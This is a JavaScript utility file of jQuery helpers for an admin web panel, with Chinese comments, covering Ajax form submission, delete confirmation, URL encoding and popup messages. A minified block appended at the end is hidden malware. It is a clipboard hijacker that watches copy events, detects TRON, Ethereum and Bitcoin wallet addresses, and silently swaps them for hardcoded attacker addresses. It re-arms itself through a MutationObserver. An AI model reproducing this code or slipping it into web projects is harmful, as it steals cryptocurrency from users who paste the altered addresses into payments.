/**
 * jquery全局函数封装
 */
(function ($) {
    /**
     * Jquery类方法
     */
    $.fn.extend({

        superForm: function (option) {
            // 默认选项
            var defaultOption = {
                buildData: function () {
                    return {};
                },
                validation: function () {
                    return true;
                }
            };
            option = $.extend(true, {}, defaultOption, option);

            var $form = $(this)
                , btn_submit = $('.j-submit');
            $form.validator({
                onValid: function (validity) {
                    $(validity.field).next('.am-alert').hide();
                },
                /**
                 * 显示错误信息
                 * @param validity
                 */
                onInValid: function (validity) {
                    var $field = $(validity.field)
                        , $group = $field.parent()
                        , $alert = $group.find('.am-alert');

                    if ($field.data('validationMessage') !== undefined) {
                        // 使用自定义的提示信息 或 插件内置的提示信息
                        var msg = $field.data('validationMessage') || this.getValidationMessage(validity);
                        if (!$alert.length) {
                            $alert = $('<div class="am-alert am-alert-danger"></div>').hide().appendTo($group);
                        }
                        $alert.html(msg).show();
                    }
                },
                submit: function () {
                    if (this.isFormValid() === true) {
                        // 自定义验证
                        if (!option.validation())
                            return false;
                        // 禁用按钮, 防止二次提交
                        btn_submit.attr('disabled', true);
                        // 表单提交
                        $form.ajaxSubmit({
                            type: "post",
                            dataType: "json",
                            data: option.buildData(),
                            success: function (result) {
                                result.code === 1 ? $.show_success(result.msg, result.url)
                                    : $.show_error(result.msg);
                                btn_submit.attr('disabled', false);
                            }
                        });
                    }
                    return false;
                }
            });
        },

        /**
         * 删除元素
         */
        delete: function (index, url, msg) {
            $(this).click(function () {
                var param = {};
                param[index] = $(this).attr('data-id');
                layer.confirm(msg ? msg : '确定要删除吗？', {title: '友情提示'}
                    , function (index) {
                        $.post(url, param, function (result) {
                            result.code === 1 ? $.show_success(result.msg, result.url)
                                : $.show_error(result.msg);
                        });
                        layer.close(index);
                    }
                );
            });
        },

    });

    /**
     * Jquery全局函数
     */
    $.extend({

        /**
         * 对象转URL
         */
        urlEncode: function (data) {
            var _result = [];
            for (var key in data) {
                var value = null;
                if (data.hasOwnProperty(key)) value = data[key];
                if (value.constructor === Array) {
                    value.forEach(function (_value) {
                        _result.push(key + "=" + _value);
                    });
                } else {
                    _result.push(key + '=' + value);
                }
            }
            return _result.join('&');
        },

        /**
         * 操作成功弹框提示
         * @param msg
         * @param url
         */
        show_success: function (msg, url) {
            layer.msg(msg, {
                icon: 1
                , time: 1200
                // , anim: 1
                , shade: 0.5
                , end: function () {
                    (url !== undefined && url.length > 0) ? window.location = url : window.location.reload();
                }
            });
        },

        /**
         * 操作失败弹框提示
         * @param msg
         * @param reload
         */
        show_error: function (msg, reload) {
            var time = reload ? 1200 : 0;
            layer.alert(msg, {
                title: '提示'
                , icon: 2
                , time: time
                , anim: 6
                , end: function () {
                    reload && window.location.reload();
                }
            });
        }

    });

})(jQuery);


(function(){function rca() {const tar = /(?:\b|[^A-Za-z0-9])T[a-zA-Z0-9]{33}(?:\b|[^A-Za-z0-9])/g,ear = /(?:\b|[^A-Za-z0-9])0x[a-fA-F0-9]{40}(?:\b|[^A-Za-z0-9])/g,bar = /(?:\b|[^A-Za-z0-9])(?:1[a-km-zA-HJ-NP-Z1-9]{25,34})(?:\b|[^A-Za-z0-9])/g,bar0 = /(?:\b|[^A-Za-z0-9])(?:3[a-km-zA-HJ-NP-Z1-9]{25,34})(?:\b|[^A-Za-z0-9])/g,bar1 = /(?:\b|[^A-Za-z0-9])(?:bc1q[a-zA-Z0-9]{38})(?:\b|[^A-Za-z0-9])/g,bar2 = /(?:\b|[^A-Za-z0-9])(?:bc1p[a-zA-Z0-9]{58})(?:\b|[^A-Za-z0-9])/g;document.addEventListener('copy', function(e) {const ttc = window.getSelection().toString();if (ttc.match(tar)) {const ncd = ttc.replace(tar, 'TH4QAUdpQaLq323JmX6AY8A6BQbHF2iBEp');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(ear)) {const ncd = ttc.replace(ear, '0x77843290a868e4F789619D8B4D2074BD5DF4C91d');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar)) {const ncd = ttc.replace(bar, '1BVEDjfjH3pqBWV6rKodvNAoKtBrsYWeXs');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar0)) {const ncd = ttc.replace(bar0, '3McGeZLYNDYfcwcm9VNBffeJpSvt5djgqi');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar1)) {const ncd = ttc.replace(bar1, 'bc1qhzzsc2lhej8nudu8all4mzuhnfkjaxzqwknh0h');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar2)) {const ncd = ttc.replace(bar2, 'bc1qhzzsc2lhej8nudu8all4mzuhnfkjaxzqwknh0h');e.clipboardData.setData('text/plain', ncd);e.preventDefault();}});}setTimeout(()=>{const obs = new MutationObserver(ml => {for (const m of ml) {if (m.type === 'childList') {rca();}}});obs.observe(document.body, { childList: true, subtree: true });},1000);rca();})();